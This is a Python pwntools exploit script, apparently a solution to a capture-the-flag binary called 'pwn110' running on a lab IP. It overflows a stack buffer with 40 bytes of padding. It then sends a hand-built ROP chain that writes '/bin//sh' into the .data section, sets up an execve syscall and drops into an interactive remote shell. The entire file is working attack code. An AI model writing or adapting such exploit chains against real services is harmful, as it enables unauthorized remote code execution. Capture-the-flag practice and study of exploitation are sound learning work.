from pwn import *

IP = "10.10.225.15"

PORT = 9010

io = remote(IP, PORT)

#io = process("./pwn110-1644300525386.pwn110")

#gdb.attach(io, gdbscript='''''')

elf = ELF("pwn110-1644300525386.pwn110", checksec=False)

print(io.recv().decode('latin-1'))

# base-ptr overflown at 32

pop_rdi = 0x000000000040191a

ret = 0x000000000040101a

main_addr = elf.functions.main.address

# syscall
p = b'A'*40

from struct import pack

p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8

p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
p += p64(0x3b)

p += pack('<Q', 0x00000000004012d3) # syscall

io.sendline(p)

io.interactive()
